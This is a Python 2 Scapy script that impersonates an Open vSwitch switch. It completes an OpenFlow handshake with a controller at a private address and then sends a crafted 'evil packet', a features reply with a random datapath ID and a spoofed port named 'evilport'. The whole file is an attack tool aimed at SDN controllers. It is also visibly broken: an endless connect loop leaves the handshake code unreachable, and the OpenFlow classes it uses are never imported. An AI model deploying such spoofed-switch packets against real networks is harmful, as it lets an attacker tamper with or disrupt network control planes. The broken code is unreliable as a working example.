#!/usr/bin/python
import sys
import time
import socket
import random
from scapy.base_classes import Net
from scapy.config import conf
from scapy.packet import *
from scapy.ansmachine import *
from scapy.plist import SndRcvList
from scapy.fields import *
from scapy.sendrecv import srp,srp1
from scapy.arch import get_if_hwaddr
# Scapy parameters
conf.verb = False

# Session parameters
dIP = "192.168.56.102"#sys.argv[1]
dPort = 6633 #int(sys.argv[2])
port_id = "port"
addr = "ca:fb:4c:24:35:4f"
dPID = "ab:cd:" + addr
# Craft the evil packet
p = OpenFlow()/OFPT_FEATURES_REPLY(DPID=RandDPID())/OFP_PHY_PORT(port_no=65534,
hw_addr=RandMAC(), portName="evilport", config=1, state=1)
# Create the handshake packets once
m1 = OpenFlow()/OFPT_HELLO()
m2 = OpenFlow()/OFPT_FEATURES_REPLY(DPID = RandDPID(), n_buffers=256, capabilities = 199, actions= \
	4095)/OFP_PHY_PORT(port_no = 65534, hw_addr = addr, portName = port_id, config = 1, state = 1)
m3 = OpenFlow()/OFPT_GET_CONFIG_REPLY(miss_send_len = 65535)
m4 = OpenFlow()/OFPT_STATS_REPLY(statType=0)/OFP_DESC_STATS_REPLY(mfr_desc='Nicira, Inc',
hw_desc='Open vSwitch', sw_desc='1.9.3', serial_num='None', dp_desc='None')
while 1:
	# Try to make the connection to the server
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((dIP,dPort))
		ss = sStreamSocket(s,Raw)
	except socket.error,e:
		print e[0]
		exit()
r0 = OpenFlow(s.recv(2048))
if type(r0.payload) is OFPT_HELLO: print "Received: HELLO"
else: r0.show()

# Send HELLO
try:
	print "Sending: HELLO"
	m1.xID = r0.xID
	r = OpenFlow(ss.sr1(Raw(str(m1))).load)
	if type(r.payload) is OFPT_FEATURES_REQUEST: print "Received: FEATURES_REQUEST"
	else:
		print "Received: "
		r.show()
except socket.error,e:
	print "Socket closed: by server"
	exit()

# Sending FEATURES_REPLY
try:
	print "Sending: FEATURES_REPLY"
	m2.xID = r0.xID
	r2 = OpenFlow(ss.sr1(Raw(str(m2))).load)
	r3 = OpenFlow(r2.payload.payload.load)
	r4 = OpenFlow(r3.payload.payload.load)
	if (type(r2.payload) is OFPT_SET_CONFIG) and (type(r3.payload) is OFPT_GET_CONFIG_REQUEST) and (type(r4.payload) is OFPT_STATS_REQUEST): print "Continued: handshake"
	
	else:
		print "Received: "
		r2.show()
except socket.error,e:
	print "Socket closed: by server"
	exit()
except AttributeError,e:
	# Probably no big deal...might not have caught all three messages at the same time
	pass

# Send GET_CONFIG_REPLY and STATS_REPLY
try:
# Note: we do not necessarily expect a reply after GET_CONFIG_REPLY
	print "Sending: GET_CONFIG_REPLY"
	ss.send(Raw(str(m3)))
except socket.error,e:
	print "Socket closed: by server"
	exit()

try:
	print "Sending: STATS_REPLY"
	r4 = OpenFlow(ss.sr1(Raw(str(m4))).load)
	if (type(r4.payload) is OFPT_FLOW_MOD): print "Received: FLOW_MOD"
	else:
		print "Received: "
		r4.show()

except socket.error,e:
	print "Socket closed: by server"
	exit()

## END HANDSHAKE
## Send the crafted packet
try:
	print "Sending: craft packet "
	ss.send(Raw(str(p)))
except socket.error,e:
	print "Socket closed: by server"